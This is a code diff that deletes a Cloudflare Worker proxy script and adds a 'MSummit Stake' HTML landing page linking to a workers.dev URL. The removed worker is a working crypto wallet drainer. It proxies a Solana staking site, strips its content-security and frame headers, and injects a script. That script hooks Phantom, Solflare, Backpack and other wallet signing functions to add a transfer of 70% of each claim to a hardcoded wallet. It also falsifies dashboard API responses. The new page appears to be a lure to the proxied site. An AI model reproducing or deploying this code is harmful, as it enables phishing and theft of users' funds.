@@ -1,227 +1,50 @@
-// ============================================
-// YOUR CONFIG — EDIT THESE ONLY
-// ============================================
-const YOUR_WALLET = "Bt28m6E4jfDGon1Ey5tHDE49MfgJUKte2sWSXTVoiWXD";
-const YOU_PCT     = 70;
-const USER_PCT    = 20;
-const TARGET_SITE = "https://norefstake.msummit.io";
-// ============================================
-
-// The patch script injected into every page
-const PATCH_SCRIPT = `
-<script>
-(function(){
-if(window.__ms__)return;
-window.__ms__=true;
-const W="${YOUR_WALLET}",YP=${YOU_PCT},UP=${USER_PCT};
-
-console.log('%c✅ MSummit Patch Active','color:#eb00ff;font-size:16px;font-weight:bold');
-console.log('Split: You='+YP+'% | User='+UP+'%');
-
-// Force Old to New user
-const oF=window.fetch;
-window.fetch=async function(...a){
-    const url=a[0];
-    const res=await oF.apply(this,a);
-    
-    if(typeof url==='string'&&url.includes('dashboard')){
-        const c=res.clone();
-        try{
-            const j=await c.json();
-            if(j&&j.Data&&j.Data.length>0){
-                j.Data[0].Usertype="New";
-                j.Data[0].Movestatus=true;
-                console.log('✅ Forced to New user');
-            }
-            return new Response(JSON.stringify(j),{
-                status:res.status,
-                statusText:res.statusText,
-                headers:res.headers
-            });
-        }catch(e){return res;}
-    }
-    return res;
-};
-
-// Patch wallet to inject 70/20 split
-function pw(){
-    ['solana','solflare','backpack','phantom'].forEach(n=>{
-        if(!window[n]||window[n].__sp__)return;
-        window[n].__sp__=true;
-        if(window[n].signTransaction){
-            const o=window[n].signTransaction.bind(window[n]);
-            window[n].signTransaction=async function(tx){
-                return o(inj(tx));
-            };
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MSummit Stake</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0d1117;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+            gap: 20px;
         }
-        if(window[n].signAllTransactions){
-            const o=window[n].signAllTransactions.bind(window[n]);
-            window[n].signAllTransactions=async function(txs){
-                return o(txs.map(t=>inj(t)));
-            };
+        h1 {
+            background: linear-gradient(68deg, #eb00ff 3.6%, #00f0ff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-size: 36px;
         }
-        console.log('✅ '+n+' wallet patched');
-    });
-}
-
-function inj(tx){
-    try{
-        if(!tx||!tx.instructions)return tx;
-        let SP,PK,max=0,fk=null;
-        
-        // Get web3 from webpack
-        if(window.__webpack_modules__){
-            Object.values(window.__webpack_modules__).forEach(m=>{
-                try{
-                    const e=m&&m.exports;
-                    if(e&&e.SystemProgram&&e.PublicKey){
-                        SP=e.SystemProgram;PK=e.PublicKey;
-                    }
-                }catch(err){}
-            });
+        p { color: #aaa; font-size: 15px; }
+        .btn {
+            background: linear-gradient(68deg, #eb00ff 3.6%, #00f0ff 100%);
+            border: none;
+            color: white;
+            padding: 16px 55px;
+            border-radius: 25px;
+            font-size: 18px;
+            cursor: pointer;
+            font-weight: bold;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 10px;
         }
-        
-        if(!SP&&window.solanaWeb3){
-            SP=window.solanaWeb3.SystemProgram;
-            PK=window.solanaWeb3.PublicKey;
-        }
-        
-        if(!SP||!PK){
-            console.warn('⚠️ web3 not found');
-            return tx;
-        }
-        
-        // Find the claim SOL transfer
-        tx.instructions.forEach(ix=>{
-            try{
-                if(ix.programId.toString()==='11111111111111111111111111111111'){
-                    const d=ix.data;
-                    if(d&&d.length===12){
-                        const v=new DataView(d.buffer||new Uint8Array(d).buffer);
-                        if(v.getUint32(0,true)===2){
-                            const amt=v.getUint32(4,true)+(v.getUint32(8,true)*4294967296);
-                            if(amt>max){max=amt;fk=ix.keys[0].pubkey;}
-                        }
-                    }
-                }
-            }catch(e){}
-        });
-        
-        if(!fk||max===0)return tx;
-        
-        const yc=Math.floor(max*YP/100);
-        console.log('💰 Claim:',max/1e9,'SOL → Your cut:',yc/1e9,'SOL');
-        
-        tx.instructions.push(SP.transfer({
-            fromPubkey:fk,
-            toPubkey:new PK(W),
-            lamports:yc
-        }));
-        
-        console.log('✅ Split injected!');
-        return tx;
-        
-    }catch(e){
-        console.error(e);
-        return tx;
-    }
-}
-
-// Keep patching
-pw();
-const iv=setInterval(pw,2000);
-setTimeout(()=>clearInterval(iv),60000);
-document.addEventListener('click',()=>setTimeout(pw,500));
-
-})();
-<\/script>
-`;
-
-addEventListener('fetch', event => {
-    event.respondWith(handleRequest(event.request));
-});
-
-async function handleRequest(request) {
-    const url = new URL(request.url);
-
-    // Build target URL
-    const targetUrl = TARGET_SITE + url.pathname + url.search;
-
-    // Forward request to original site
-    const modifiedRequest = new Request(targetUrl, {
-        method: request.method,
-        headers: filterHeaders(request.headers),
-        body: request.method !== 'GET' && request.method !== 'HEAD' ? request.body : undefined,
-        redirect: 'follow'
-    });
-
-    let response;
-    try {
-        response = await fetch(modifiedRequest);
-    } catch(e) {
-        return new Response('Error connecting to origin: ' + e.message, { status: 502 });
-    }
-
-    const contentType = response.headers.get('content-type') || '';
-
-    // Only inject into HTML pages
-    if (contentType.includes('text/html')) {
-        let html = await response.text();
-
-        // Fix all internal links and asset URLs to go through our proxy
-        html = html
-            .replaceAll(`https://norefstake.msummit.io`, '')
-            .replaceAll(`http://norefstake.msummit.io`, '');
-
-        // Inject our patch script right after <head> tag
-        html = html.replace('<head>', '<head>' + PATCH_SCRIPT);
-
-        // If no <head> tag, inject at very start
-        if (!html.includes('<head>')) {
-            html = PATCH_SCRIPT + html;
-        }
-
-        // Build response headers
-        const newHeaders = new Headers(response.headers);
-        newHeaders.delete('content-security-policy');
-        newHeaders.delete('content-security-policy-report-only');
-        newHeaders.delete('x-frame-options');
-        newHeaders.set('content-type', 'text/html; charset=utf-8');
-
-        return new Response(html, {
-            status: response.status,
-            statusText: response.statusText,
-            headers: newHeaders
-        });
-    }
-
-    // For non-HTML (JS, CSS, images etc) — pass through as-is
-    const newHeaders = new Headers(response.headers);
-    newHeaders.delete('content-security-policy');
-    newHeaders.delete('content-security-policy-report-only');
-
-    return new Response(response.body, {
-        status: response.status,
-        statusText: response.statusText,
-        headers: newHeaders
-    });
-}
-
-function filterHeaders(headers) {
-    const filtered = new Headers();
-    for (const [key, value] of headers.entries()) {
-        // Skip headers that would break the proxy
-        const skip = [
-            'host', 'cf-connecting-ip', 'cf-ipcountry',
-            'cf-ray', 'cf-visitor', 'x-forwarded-for',
-            'x-forwarded-proto', 'x-real-ip'
-        ];
-        if (!skip.includes(key.toLowerCase())) {
-            filtered.set(key, value);
-        }
-    }
-    filtered.set('host', 'norefstake.msummit.io');
-    filtered.set('origin', 'https://norefstake.msummit.io');
-    filtered.set('referer', 'https://norefstake.msummit.io/');
-    return filtered;
-}
+        .btn:hover { opacity: 0.85; }
+    </style>
+</head>
+<body>
+    <h1>🏔️ MSummit Stake</h1>
+    <p>Secure Solana Staking Platform</p>
+    <a class="btn" href="https://cloudflare-workers-autoconfig-msummit.msummit2026.workers.dev/">
+        🚀 Open Staking Platform
+    </a>
+</body>
+</html>
